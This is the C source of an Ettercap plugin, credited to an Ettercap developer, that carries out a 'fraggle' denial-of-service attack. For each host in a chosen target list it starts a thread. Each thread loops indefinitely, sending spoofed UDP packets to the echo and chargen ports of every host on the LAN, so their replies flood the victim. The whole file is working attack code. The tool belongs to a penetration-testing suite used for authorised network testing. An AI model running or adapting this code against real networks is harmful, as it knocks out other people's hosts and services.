/*
 * 	  Copyright (c) Ettercap Dev. Team
 *
 *    The fraggle attack plugin for ettercap.
 *
 *    Written by:
 *    Antonio Collarino (sniper)  <anto.collarino@gmail.com>
 */

#include <ec.h>
#include <ec_inet.h>
#include <ec_plugins.h>
#include <ec_send.h>
#include <ec_threads.h>
#include <ec_sleep.h>

#define UDP_PORT_7  7    //udp echo
#define UDP_PORT_19 19   //udp chargen

/* prototypes */
int plugin_load(void *);
static int fraggle_attack_init(void *);
static int fraggle_attack_fini(void *);
static int fraggle_attack_unload(void *);
static EC_THREAD_FUNC(fraggler);

/* globals */
struct plugin_ops fraggle_attack_ops = {
   .ettercap_version =     EC_VERSION,
   .name =                 "fraggle_attack",
   .info =                 "Run a fraggle attack against hosts of target one",
   .version =              "1.0",
   .init =                 &fraggle_attack_init,
   .fini =                 &fraggle_attack_fini,
   .unload =               &fraggle_attack_unload,
};


int plugin_load(void *handle)
{
   return plugin_register(handle, &fraggle_attack_ops);
}

static int fraggle_attack_init(void *dummy)
{
   struct ip_list *i;

   /* variable not used */
   (void) dummy;

   DEBUG_MSG("fraggle_attack_init");

   if(EC_GBL_OPTIONS->unoffensive) {
      INSTANT_USER_MSG("fraggle_attack: plugin doesn't work in unoffensive mode.\n");
      return PLUGIN_FINISHED;
   }

   if(EC_GBL_TARGET1->all_ip && EC_GBL_TARGET1->all_ip6) {
      USER_MSG("Add at least one host to target one list.\n");
      return PLUGIN_FINISHED;
   }

   if(LIST_EMPTY(&EC_GBL_HOSTLIST)) {
      USER_MSG("Global host list is empty.\n");
      return PLUGIN_FINISHED;
   }

   EC_GBL_OPTIONS->quiet = 1;
   INSTANT_USER_MSG("fraggle_attack: starting fraggle attack against hosts of target one.\n");

   /* (IPv4) creating a thread per target 1 */
   LIST_FOREACH(i, &EC_GBL_TARGET1->ips, next) {
      ec_thread_new("fraggler", "thread performing a fraggle attack", &fraggler, &i->ip);
   }

   /*(IPv6) creating a thread per target 1 */
   LIST_FOREACH(i, &EC_GBL_TARGET1->ip6, next) {
      ec_thread_new("fraggler", "thread performing a fraggle attack", &fraggler, &i->ip);
   }

   return PLUGIN_RUNNING;
}

static int fraggle_attack_fini(void *dummy)
{
   pthread_t pid;

   /* variable not used */
   (void) dummy;

   DEBUG_MSG("fraggle_attack_fini");

   while(!pthread_equal(ec_thread_getpid(NULL), pid = ec_thread_getpid("fraggler"))) {
      ec_thread_destroy(pid);
   }

   return PLUGIN_FINISHED;
}

static int fraggle_attack_unload(void *dummy)
{
   /* variable not used */
   (void) dummy;

   return PLUGIN_UNLOADED;
}

static EC_THREAD_FUNC(fraggler)
{
   struct ip_addr *ip;
   struct hosts_list *h, *htmp;
   u_int16 proto;
   u_int8 payload[8];
   u_int16 port_echo, port_chargen;
   size_t length;

   DEBUG_MSG("EC_THREAD_FUNC fraggler");

   ec_thread_init();

   ip = EC_THREAD_PARAM;
   proto = ntohs(ip->addr_type);
   port_echo= htons(UDP_PORT_7);
   port_chargen= htons(UDP_PORT_19);
   memset(payload, 0, sizeof(payload));
   length= (size_t) sizeof(payload);

   if((proto != AF_INET) && (proto != AF_INET6))
	   ec_thread_destroy(ec_thread_getpid(NULL));

   LOOP {
      CANCELLATION_POINT();

      LIST_FOREACH_SAFE(h, &EC_GBL_HOSTLIST, next, htmp)
      	  if(ntohs(h->ip.addr_type) == proto) {
            	send_udp(ip, &h->ip, h->mac, port_echo, port_echo, payload, length);
            	send_udp(ip, &h->ip, h->mac, port_chargen, port_chargen, payload, length);
            }

      ec_usleep(1000*1000/EC_GBL_CONF->sampling_rate);
   }

   return NULL;
}
